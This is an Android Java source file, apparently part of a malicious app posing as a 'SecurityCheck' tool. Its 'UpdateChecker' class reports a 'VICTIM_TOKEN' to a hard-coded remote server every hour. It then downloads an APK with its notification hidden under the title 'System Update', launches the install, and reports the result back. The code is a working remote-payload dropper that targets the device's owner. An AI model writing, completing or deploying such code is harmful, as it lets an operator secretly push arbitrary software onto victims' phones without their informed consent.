// app/src/main/java/com/sec/check/UpdateChecker.java
package com.sec.check;

import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import androidx.core.content.FileProvider;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;

/**
 * UpdateChecker - نظام التحديث التلقائي
 * =====================================================
 * - يفحص السيرفر كل ساعة
 * - لو فيه تحديث → يحمّله في الخلفية
 * - يثبته تلقائياً (بدون تدخل المستخدم)
 */
public class UpdateChecker {

    private static final String TAG = "SecurityCheck";
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
    private static final long CHECK_INTERVAL = 60 * 60 * 1000; // ساعة
    private static final long LAST_CHECK_KEY = 0;
    private static long lastCheckTime = 0;

    private static final String APK_MIME = "application/vnd.android.package-archive";

    // ============================================================
    // نقطة الدخول الرئيسية
    // ============================================================
    public static void checkForUpdate(final Context context) {
        // لو فحصنا قريباً، تجاهل
        long now = System.currentTimeMillis();
        if (now - lastCheckTime < CHECK_INTERVAL) {
            return;
        }
        lastCheckTime = now;

        new Thread(() -> {
            try {
                doCheck(context);
            } catch (Exception e) {
                Log.e(TAG, "[UPDATE] check error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    // فحص التحديث
    // ============================================================
    private static void doCheck(Context context) {
        try {
            int currentVersion = getCurrentVersionCode(context);
            String victimToken = "";

            try {
                victimToken = BuildConfig.VICTIM_TOKEN;
            } catch (Exception e) {
                victimToken = "DEFAULT_TOKEN";
            }

            // build URL
            String url = SERVER_URL + "/apk/update/check"
                    + "?version=" + currentVersion
                    + "&token=" + victimToken;

            Log.d(TAG, "[UPDATE] Checking: v" + currentVersion);

            String response = httpGet(url);
            if (response == null || response.isEmpty()) {
                Log.d(TAG, "[UPDATE] No response");
                return;
            }

            JSONObject json = new JSONObject(response);
            boolean hasUpdate = json.optBoolean("update", false);

            if (!hasUpdate) {
                Log.d(TAG, "[UPDATE] Already latest");
                return;
            }

            int latestVersion = json.optInt("latest_version", 0);
            String downloadUrl = json.optString("download_url", "");
            String releaseName = json.optString("release_name", "update.apk");
            long size = json.optLong("size", 0);
            String sha256 = json.optString("sha256", "");

            Log.d(TAG, "[UPDATE] New version available: " + latestVersion
                    + " | size: " + (size / 1024 / 1024) + " MB");

            // حمّل وثبّت
            downloadAndInstall(context, downloadUrl, releaseName,
                    currentVersion, latestVersion);

        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] doCheck error: " + e.getMessage());
        }
    }

    // ============================================================
    // تحميل وتثبيت
    // ============================================================
    private static void downloadAndInstall(Context context,
                                            String url,
                                            String filename,
                                            int fromVersion,
                                            int toVersion) {
        try {
            // وجّه لإشعار تحديث
            reportUpdate(context, "downloading", fromVersion, toVersion, "");

            // مجلد التحميل
            File downloadsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
            if (downloadsDir == null) {
                downloadsDir = new File(context.getCacheDir(), "downloads");
            }
            if (!downloadsDir.exists()) {
                downloadsDir.mkdirs();
            }

            File apkFile = new File(downloadsDir, "update.apk");
            if (apkFile.exists()) {
                apkFile.delete();
            }

            // استخدم DownloadManager
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setTitle("System Update");
            request.setDescription("Downloading...");
            request.setNotificationVisibility(
                    DownloadManager.Request.VISIBILITY_HIDDEN);
            request.setDestinationUri(Uri.fromFile(apkFile));
            request.setMimeType(APK_MIME);

            DownloadManager dm = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
            if (dm == null) {
                Log.e(TAG, "[UPDATE] DownloadManager null");
                return;
            }

            final long downloadId = dm.enqueue(request);
            Log.d(TAG, "[UPDATE] Download enqueued: " + downloadId);

            // استقبل لما يخلص
            BroadcastReceiver receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    try {
                        long id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
                        if (id != downloadId) return;

                        // افحص الحالة
                        DownloadManager.Query query = new DownloadManager.Query();
                        query.setFilterById(downloadId);
                        android.database.Cursor cursor = dm.query(query);

                        if (cursor != null && cursor.moveToFirst()) {
                            int statusIdx = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS);
                            int status = cursor.getInt(statusIdx);

                            if (status == DownloadManager.STATUS_SUCCESSFUL) {
                                Log.d(TAG, "[UPDATE] Download complete");
                                installApk(ctx, apkFile, fromVersion, toVersion);
                            } else {
                                Log.e(TAG, "[UPDATE] Download failed: status=" + status);
                                reportUpdate(ctx, "failed", fromVersion, toVersion,
                                        "download_status_" + status);
                            }
                            cursor.close();
                        }

                        // امسح الـ receiver
                        try {
                            ctx.unregisterReceiver(this);
                        } catch (Exception ignored) {}
                    } catch (Exception e) {
                        Log.e(TAG, "[UPDATE] receiver error: " + e.getMessage());
                    }
                }
            };

            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(receiver,
                        new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE),
                        Context.RECEIVER_EXPORTED);
            } else {
                context.registerReceiver(receiver,
                        new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
            }

        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] downloadAndInstall error: " + e.getMessage());
            reportUpdate(context, "failed", fromVersion, toVersion,
                    "exception: " + e.getMessage());
        }
    }

    // ============================================================
    // تثبيت الـ APK
    // ============================================================
    private static void installApk(Context context, File apkFile,
                                    int fromVersion, int toVersion) {
        try {
            if (!apkFile.exists() || apkFile.length() < 10000) {
                Log.e(TAG, "[UPDATE] APK file invalid");
                reportUpdate(context, "failed", fromVersion, toVersion, "file_invalid");
                return;
            }

            Log.d(TAG, "[UPDATE] Installing: " + apkFile.length() + " bytes");

            Intent installIntent = new Intent(Intent.ACTION_VIEW);

            Uri apkUri;
            if (Build.VERSION.SDK_INT >= 24) {
                // استخدم FileProvider للأندرويد 7+
                apkUri = FileProvider.getUriForFile(
                        context,
                        context.getPackageName() + ".fileprovider",
                        apkFile
                );
            } else {
                apkUri = Uri.fromFile(apkFile);
            }

            installIntent.setDataAndType(apkUri, APK_MIME);
            installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            context.startActivity(installIntent);

            reportUpdate(context, "success", fromVersion, toVersion, "");

            Log.d(TAG, "[UPDATE] Install intent sent");

        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] installApk error: " + e.getMessage());
            reportUpdate(context, "failed", fromVersion, toVersion,
                    "install: " + e.getMessage());
        }
    }

    // ============================================================
    // بلّغ السيرفر
    // ============================================================
    private static void reportUpdate(Context context, String status,
                                      int fromVersion, int toVersion,
                                      String error) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("status", status);
                payload.put("from_version", fromVersion);
                payload.put("to_version", toVersion);
                payload.put("error", error);
                payload.put("timestamp", System.currentTimeMillis());

                try {
                    payload.put("token", BuildConfig.VICTIM_TOKEN);
                } catch (Exception e) {
                    payload.put("token", "DEFAULT_TOKEN");
                }

                String url = SERVER_URL + "/apk/update/report";
                httpPostJson(url, payload.toString());

            } catch (Exception e) {
                Log.e(TAG, "[UPDATE] report error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    // Helpers
    // ============================================================
    private static int getCurrentVersionCode(Context context) {
        try {
            PackageInfo info = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0);
            return info.versionCode;
        } catch (PackageManager.NameNotFoundException e) {
            return 1;
        }
    }

    private static String httpGet(String urlStr) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] httpGet error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
        return null;
    }

    private static void httpPostJson(String urlStr, String jsonBody) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            java.io.OutputStream os = conn.getOutputStream();
            os.write(jsonBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "[UPDATE] httpPost error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
                  }
